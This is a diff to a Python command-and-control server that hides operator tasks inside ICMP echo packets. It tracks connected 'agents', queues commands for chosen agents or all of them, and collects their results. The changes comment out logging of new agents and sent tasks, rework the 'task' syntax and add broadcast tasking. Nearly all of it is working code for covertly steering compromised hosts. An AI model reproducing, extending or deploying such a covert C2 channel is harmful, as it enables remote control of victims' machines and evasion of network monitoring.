@@ -82,7 +82,7 @@ def handle_packet(pkt):
                 agent_id = get_next_agent_id()
                 AGENT_INFO[agent_id] = {"ip": src, "last_seen": time.time()}
                 ACTIVE_AGENTS.add(agent_id)
-                print(f"\n[+] New agent connected: {agent_id} ({src})")
+                # print(f"\n[+] New agent connected: {agent_id} ({src})")
             else:
                 # Update last_seen timestamp
                 AGENT_INFO[agent_id]["last_seen"] = time.time()
@@ -96,7 +96,7 @@ def handle_packet(pkt):
                 task = queue.pop(0)   # get ONE command (FIFO)
                 # Build reply packet as an echo request so it is routed properly.
                 send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)
-                print(f"[+] Sent task to {agent_id} ({src}): {task}")
+                # print(f"[+] Sent task to {agent_id} ({src}): {task}")
 
                 if not queue:
                     COMMANDS.pop(agent_id, None)
@@ -121,14 +121,15 @@ def operator_console():
         if not cmd_line:
             continue
 
-        parts = cmd_line.split(" ", 2)  # Splits the task command into two parts: the identifier (id, ip) and the command.
+        parts = cmd_line.split(" ", 2)
         cmd = parts[0].lower()
 
         if cmd == "help":
             print("Commands:")
             print("  list                         - List active agents (shows id, ip, age)")
             print("  info <id|ip>                 - Show detailed info for an agent")
-            print("  task <cmd> <id|ip>           - Queue a command for a list of agents separated by a comma")
+            print("  task <id|ip list> <cmd>      - Queue a command for a list of agents separated by a comma (no space)")
+            print("  task all <cmd>               - Queue a command for all active agents")
             print("  results <id|ip>              - Show results from an agent")
             print("  exit                         - Stop the server")
             continue
@@ -177,24 +178,24 @@ def operator_console():
 
         if cmd == "task":   # working on this
             if len(parts) < 3:
-                print("Usage: task <command> <agent_id|ip>")
+                print("Usage: task <agent_id|ip list> <command>")
                 continue
-            identifiers = parts[2].split(", ") # list of ids or ips to queue the command for.
-            print("list of identifiers:" + str(identifiers))
+            identifiers = parts[1].split(",") # list of ids or ips to queue the command for.
             for identifier in identifiers:
-                agent_id = find_agent_by_identifier(identifier)
-                print(f"[DEBUG] identifier={identifier} resolved_to={agent_id}")
-
-                command_text = parts[1]
-                if not agent_id:
-                    print(f"No such agent (or stale) for {identifier}")
-                    continue
-                with lock:
-                    # optional staleness check
-                    COMMANDS.setdefault(agent_id, []).append(command_text)
-                    # report back which agent id and ip got the task
-                    ip = AGENT_INFO.get(agent_id, {}).get("ip")
-                    print(f"[+] Queued command for id={agent_id} ip={ip}: {command_text}")
+                command_text = parts[2]
+                if identifier == "all":
+                    with lock:
+                        for agent_id in ACTIVE_AGENTS:
+                            COMMANDS.setdefault(agent_id, []).append(command_text)
+                else:
+                    agent_id = find_agent_by_identifier(identifier)
+                    if not agent_id:
+                        print(f"No such agent (or stale) for {identifier}")
+                        continue
+                    with lock:
+                        COMMANDS.setdefault(agent_id, []).append(command_text)
+                        ip = AGENT_INFO.get(agent_id, {}).get("ip")
+                        print(f"[+] Queued command for id={agent_id} ip={ip}: {command_text}")
             continue
 
         if cmd == "results":
@@ -212,7 +213,7 @@ def operator_console():
                     print(f"No results for {identifier}")
                     continue
                 full_result = "\n".join(chunk for _, chunk in chunks)
-                print(f"--- Results from id={identifier} ---")
+                print(f"----- Results from id={identifier} -----")
                 print(full_result)
                 print("-------------------------------")
                 RESULTS[agent_id] = []
